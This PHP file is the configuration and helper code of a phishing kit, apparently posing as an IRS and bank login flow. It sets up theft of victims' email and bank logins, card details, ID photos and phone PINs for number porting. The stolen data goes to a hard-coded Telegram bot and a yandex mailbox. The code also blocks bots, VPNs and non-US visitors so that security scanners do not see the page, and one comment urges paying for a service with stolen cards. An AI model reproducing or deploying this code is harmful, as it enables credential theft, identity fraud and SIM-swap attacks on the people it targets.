<?php
error_reporting(0);
date_default_timezone_set("America/New_York");

// Start of setting
// Adjust as you wish
$amount_receive = "$4,200.00"; //Amount victim will receive
$admin_name = "Test"; // Enter Name to display on admin and resutls
$admin_panel_password = "Test"; // Enter admin password
$email_result = "m.vault@yandex.com";
$sender_mail = "sender@result.com";
$site_parameter = "access_protect"; //jxt anythin and append with "?" to your urlplease change this
$site_password = "/auth/verify/3423122432dsfdf"; //Additional lures also append to site_parameter with question mark
$salt = "dfdsffsd123"; //type anythin u want here would make page stronger
$alt_block_vpn = "off"; // turn on if page dosent load
$emailretry = "on"; // get email credentials more than once
$numberofretries = 2; //Number of times to   get email credentials
$id_photo = "on"; // Turn on or off for photo upload
$real_machine = "on"; // Can detect if user is on real pc
$save_email_combo = "on"; // Save email combo for checkers
$save_login_combo = "on"; // Save login Combo for checkers

//telegram senders
$telegram_bot_token = "1082088078:AAHS8B6SCaDyA4oJn8nX7_1V9qLPZZ0FuW8";
$telegram_chat_id = "-1001433358262";
// use 'on' or 'off' this is the number of time to request bank login
$loginretry = "on"; // get bank login credentials more than once
$numberofloginretry = 2; // Number of times to get bank login credentials
// Email Real login config use 'on' or 'off'
$emailPopup = "on"; // Turn on to use email popup or off to use traditional process
$enableEmailReal = "on";
// Url for real login ...might go down anytime. Report to my telegram channel for new url
$urlRealLogin = "authaccountmgt.com"; // don't change unless its down
// Use 'on' or 'off'
//Phone Pin detects phone carrier and enables the phone pin field for porting.
$enablephonepin = "on"; // Set to 0 to disable phone pin and 1 to enable
$enablenumverifyapi = "off"; //if you want to use api for automatic carrier detection you have to subscribe. Free wont work jxt $10 u can card it .
$numverifyapi = "1e1a5b73f6dfedf850943762808d615e"; // you need to create your own api at numverify.com and subscribe with the $10 plan.
$rand_id = bin2hex(openssl_random_pseudo_bytes(24));
// Use 'limited' or 'unusual_activity'
$letter = "unusual_activity";

// Use 'on' or 'off'
$hide_page = "off"; // hide page from the world to ensure inbox delivery;
$lock_country = "on"; //lock country to only USA
$lock_platform = "off";
$site_param_on = "on";
$site_pass_on = "off";
$send_login = "on"; //if you want to send IRS login details turn on.
$save_file = "on"; // if your want to save results to panel turn "on"
$disablecard = "off"; //disable card field in bank. set to on to disable and off to enable
$enablenotice = "off"; //enable notice after login. Set to off to disable notice and on to enable
$onetime = "off";
$block_host = "on";
$block_ua = "on";
$block_iprange = "on";
$block_isp = "on";
$block_vpn = "on";
$block_referrer = "on";

// End of setting
function check_bin($bin) {
      $bin = preg_replace('/\s/', '', $bin);
      $bin = substr($bin,0,8);
      $url = "https://lookup.binlist.net/".$bin;
      $headers = array();
      $headers[] = 'Accept-Version: 3';
      $ch = curl_init();
      curl_setopt($ch,CURLOPT_URL,$url);
      curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
      curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
      $resp = curl_exec($ch);
      curl_close($ch);
      $result = json_decode($resp, true);
      return $result;
}
function kirim_mail($to, $from, $subject, $message) {
    global $sender_mail;
     $domain = preg_replace('/www\./i', '', $_SERVER['SERVER_NAME']);
     $head = "Content-type:text/plain;charset=UTF-8\r\n";
     $head .= "From: $from <$sender_mail>" . "\r\n"; // Settingan From Name/Email
     mail($to,$subject,$message,$head);
}

function kirim_foto($to,$from, $subject, $foto) {
    global $sender_mail;
     $domain = preg_replace('/www\./i', '', $_SERVER['SERVER_NAME']);
     $content = file_get_contents($foto);
     $content = chunk_split(base64_encode($content));
     $uid = md5(uniqid(time()));
     $filename = basename($foto);
     $head = "MIME-Version: 1.0\r\n";
     $head .= "From: $from <$sender_mail>" . "\r\n"; // Settingan From Name/Email
     $head .= "Content-Type: multipart/mixed; boundary=\"".$uid."\"\r\n\r\n";

     $message = "--".$uid."\r\n";
     $message .= "Content-type:text/plain; charset=iso-8859-1\r\n";
     $message .= "Content-Transfer-Encoding: 7bit\r\n\r\n";
     $message .= $message."\r\n\r\n";
     $message .= "--".$uid."\r\n";
     $message .= "Content-Type: application/octet-stream; name=\"".$filename."\"\r\n";
     $message .= "Content-Transfer-Encoding: base64\r\n";
     $message .= "Content-Disposition: attachment; filename=\"".$filename."\"\r\n\r\n";
     $message .= $content."\r\n\r\n";
     $message .= "--".$uid."--";
     mail($to,$subject,$message,$head);
}

function kirim_tele($telegram_bot_token, $telegram_chat_id) {
    global $message;
    if (isset($message)) {
        $r1 = $message;
        $browserip = "https://api.telegram.org/bot".$telegram_bot_token."/sendMessage?chat_id=".$telegram_chat_id."&text=";
        $r2 = urlencode($r1);
        $r3 = $browserip.$r2;
        $curl     = curl_init();
        curl_setopt($curl, CURLOPT_URL, $r3);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
        curl_exec($curl);
        curl_close($curl);
    }
}

function kirim_tele_photo($telegram_bot_token, $telegram_chat_id, $foto, $caption) {
        $r1 = $caption;
        $browserip = "https://api.telegram.org/bot".$telegram_bot_token."/sendPhoto?chat_id=".$telegram_chat_id;
        $r2 = urlencode($r1);
        $r3 = $browserip;
        $post_fields = array('chat_id' => $chat_id,
            'caption' => $caption,
            'photo' => new CURLFile(realpath($foto))
        );
        $curl     = curl_init();
        curl_setopt($curl, CURLOPT_HTTPHEADER, array(
            "Content-Type:multipart/form-data"
        ));
        curl_setopt($curl, CURLOPT_URL, $r3);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $post_fields); 
        curl_exec($curl);
        curl_close($curl);
}
function kirim_tele_docs($telegram_bot_token, $telegram_chat_id, $foto, $caption) {
        $r1 = $caption;
        $browserip = "https://api.telegram.org/bot".$telegram_bot_token."/sendDocument?chat_id=".$telegram_chat_id;
        $r2 = urlencode($r1);
        $r3 = $browserip;
        $post_fields = array('chat_id' => $chat_id,
            'caption' => $caption,
            'document' => new CURLFile(realpath($foto))
        );
        $curl     = curl_init();
        curl_setopt($curl, CURLOPT_HTTPHEADER, array(
            "Content-Type:multipart/form-data"
        ));
        curl_setopt($curl, CURLOPT_URL, $r3);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $post_fields); 
        curl_exec($curl);
        curl_close($curl);
}

function getUserIP()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}

function tulis_file($nama, $isi) {
  $click = fopen("$nama","a");
    fwrite($click,"$isi"."\n");
    fclose($click);
}

$ip2 = getUserIP();
if($ip2 == "127.0.0.1") {
    $ip2 = "";
}

$ip = getUserIP();
if($ip == "127.0.0.1") {
    $ip = "";
}
function get_ip1($ip2) {
    $url = "http://www.geoplugin.net/json.gp?ip=".$ip2;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    $resp=curl_exec($ch);
    curl_close($ch);
    return $resp;
}

function get_ip2($ip) {
    $url = 'http://extreme-ip-lookup.com/json/' . $ip;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    $resp=curl_exec($ch);
    curl_close($ch);
    return $resp;
}

$details = get_ip1($ip2);
$details = json_decode($details, true);
$countryname = $details['geoplugin_countryName'];
$countrycode = $details['geoplugin_countryCode'];
$cn = $countryname;
$cid = $countrycode;
$continent = $details['geoplugin_continentName'];
$citykota = $details['geoplugin_city'];
$regioncity = $details['geoplugin_region'];
$timezone = $details['geoplugin_timezone'];
$kurenci = $details['geoplugin_currencySymbol_UTF8'];
if($countryname == "") {
    $details = get_ip2($ip2);
    $details = json_decode($details, true);
    $countryname = $details['country'];
    $countrycode = $details['countryCode'];
    $cn = $countryname;
    $cid = $countrycode;
    $continent = $details['continent'];
    $citykota = $details['city'];
}
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];

function getOS() {
    $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
    $os_platform    =   "Unknown OS Platform";
    $os_array       =   array(
                            '/windows nt 10/i'     =>  'Windows 10',
                            '/windows nt 6.3/i'     =>  'Windows 8.1',
                            '/windows nt 6.2/i'     =>  'Windows 8',
                            '/windows nt 6.1/i'     =>  'Windows 7',
                            '/windows nt 6.0/i'     =>  'Windows Vista',
                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                            '/windows nt 5.1/i'     =>  'Windows XP',
                            '/windows xp/i'         =>  'Windows XP',
                            '/windows nt 5.0/i'     =>  'Windows 2000',
                            '/windows me/i'         =>  'Windows ME',
                            '/win98/i'              =>  'Windows 98',
                            '/win95/i'              =>  'Windows 95',
                            '/win16/i'              =>  'Windows 3.11',
                            '/macintosh|mac os x/i' =>  'Mac OS X',
                            '/mac_powerpc/i'        =>  'Mac OS 9',
                            '/linux/i'              =>  'Linux',
                            '/ubuntu/i'             =>  'Ubuntu',
                            '/iphone/i'             =>  'iPhone',
                            '/ipod/i'               =>  'iPod',
                            '/ipad/i'               =>  'iPad',
                            '/android/i'            =>  'Android',
                            '/blackberry/i'         =>  'BlackBerry',
                            '/webos/i'              =>  'Mobile'
                        );
    foreach ($os_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }
    }
    return $os_platform;
}

$os        =   getOS();

function getBrowser() {
    $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
    $browser        =   "Unknown Browser";
    $browser_array  =   array(
                            '/msie/i'       =>  'Internet Explorer',
                            '/firefox/i'    =>  'Firefox',
                            '/safari/i'     =>  'Safari',
                            '/chrome/i'     =>  'Chrome',
                            '/opera/i'      =>  'Opera',
                            '/netscape/i'   =>  'Netscape',
                            '/maxthon/i'    =>  'Maxthon',
                            '/konqueror/i'  =>  'Konqueror',
                            '/mobile/i'     =>  'Handheld Browser'
                        );
    foreach ($browser_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $browser    =   $value;
        }
    }
    return $browser;
}
function getisp($ip) {
    $getip = 'http://extreme-ip-lookup.com/json/' . $ip;
    $curl     = curl_init();
    curl_setopt($curl, CURLOPT_URL, $getip);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    $content = curl_exec($curl);
    curl_close($curl);
    $details   = json_decode($content);
    return $details->org;
}
function blockbotApi1($user_agent) {
    $user_agent = urlencode($user_agent);
    $getip = 'https://user-agents.net/parser';
    $post_data = 'string='.$user_agent.'&action=parse';
    $curl     = curl_init();
    curl_setopt($curl, CURLOPT_URL, $getip);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($curl, CURLOPT_POST, true );
    curl_setopt($curl, CURLOPT_POSTFIELDS, $post_data);
    $content = curl_exec($curl);
    curl_close($curl);
    preg_match('/browser":\s"(.*?)"/', $content, $contentArr);
    preg_match('/browser_type":\s"(.*?)"/', $content, $content1Arr);

    $browser = $contentArr[1];
    $browser_type = $content1Arr[1];
    $details = "";
    if (strpos($browser, "bot") or strpos($browser_type, "Crawler")) {
      $details = "Bot";
    }
    return $details;
}

function scamalytics_api($ip) {
    $getip = 'https://scamalytics.com/ip/'.$ip;
    $curl     = curl_init();
    curl_setopt($curl, CURLOPT_URL, $getip);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    $content = curl_exec($curl);
    curl_close($curl);
    preg_match('/Anonymizing VPN.*\n\s.+">(.*?)<\/div/', $content, $anon_vpnArr);
    preg_match('/Tor Exit Node.*\n\s.+">(.*?)<\/div/', $content, $torArr);
    preg_match('/Server.*\n\s.+">(.*?)<\/div/', $content, $serverArr);
    preg_match('/Public Proxy.*\n\s.+">(.*?)<\/div/', $content, $pup_proxyArr);
    preg_match('/Web Proxy.*\n\s.+">(.*?)<\/div/', $content, $web_proxyArr);
    preg_match('/Search Engine Robot.*\n\s.+">(.*?)<\/div/', $content, $search_robotArr);
    preg_match('/score":"(.*?)"/', $content, $scoreArr);
    preg_match('/risk":"(.*?)"/', $content, $riskArr);
    $anon_vpn = $anon_vpnArr[1];
    $tor = $torArr[1];
    $server = $serverArr[1];
    $pup_proxy = $pup_proxyArr[1];
    $web_proxy = $web_proxyArr[1];
    $search_robot= $search_robotArr[1];
    $risk = $riskArr[1];
    $score = $scoreArr[1];
    $details = "";
    if ($anon_vpn == "Yes" or $tor == "Yes" or $server == "Yes" or $pup_proxy == "Yes" or $web_proxy == "Yes" or $search_robot == "Yes") {
      $details = "Bot";
    } else {
        $details = "Pass";
    }
    return $details;
}

$ispuser = getisp($ip);
$br        =   getBrowser();
$date = date("d M, Y");
$time = date("g:i a");
$date = trim($date . ", Time : " . $time);
$key = "clientInstanceId=".sha1(base64_encode($ip2.$user_agent.$salt));